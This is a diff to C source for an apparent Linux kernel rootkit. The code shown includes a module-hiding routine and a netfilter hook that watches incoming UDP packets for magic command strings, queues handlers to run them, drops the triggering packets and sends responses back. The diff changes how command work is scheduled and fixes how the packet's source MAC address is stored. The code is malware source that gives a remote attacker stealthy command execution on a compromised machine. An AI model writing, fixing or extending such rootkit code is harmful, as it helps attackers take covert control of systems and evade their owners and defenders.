@@ -27,7 +27,6 @@ static struct list_head *modules;
 
 static char *test_path_name = "/home/yanayg/test_file";
 static char *test_path_name2 = "/home/yanayg/test_file2";
-//static struct socket *cmd_socket = NULL;
 static unsigned long proc_ino = 0;
 
 static void hide_module(void) {
@@ -534,8 +533,6 @@ static int send_response(
     return dev_queue_xmit(skb);
 }
 
-static struct workqueue_struct *command_handler_queue;
-
 struct MRK_command_work {
     struct work_struct work;
     struct cmd_type *cmd;
@@ -587,7 +584,7 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
     for (i = 0; i < cmds_len; i++) {
         if (!match_cmd(cmds + i, user_data + job_id_len + strlen(cmd_magic))) {
               command_work = kmalloc(sizeof(struct MRK_command_work), GFP_KERNEL);
-              INIT_WORK((struct work_struct *)command_work, handle_command);
+              INIT_WORK(&command_work->work, handle_command);
               command_work->cmd = cmds + i;
               user_data_copy = kmalloc(user_data_len, GFP_KERNEL);
               memcpy(user_data_copy, user_data, user_data_len);
@@ -596,9 +593,9 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
               command_work->daddr = iph->daddr;
               command_work->saddr = iph->saddr;
               command_work->source = udph->source;
-              command_work->h_source = eth_hdr(skb)->h_source;
+              memcpy(command_work->h_source, eth_hdr(skb)->h_source, ETH_ALEN);
               command_work->dev = skb->dev;
-              queue_work(command_handler_queue, (struct work_struct *)command_work);
+              schedule_work((struct work_struct *)command_work);
             return NF_DROP;
         }
     }
@@ -609,7 +606,6 @@ static unsigned int MRK_hookfn(void *priv, struct sk_buff *skb, const struct nf_
 struct nf_hook_ops *net_hook;
 
 static int MRK_init_nethook(void) {
-    command_handler_queue = create_workqueue("command_handler");
     net_hook = kmalloc(sizeof(struct nf_hook_ops), GFP_KERNEL);
     net_hook->hook = MRK_hookfn;
     net_hook->hooknum = NF_INET_PRE_ROUTING;
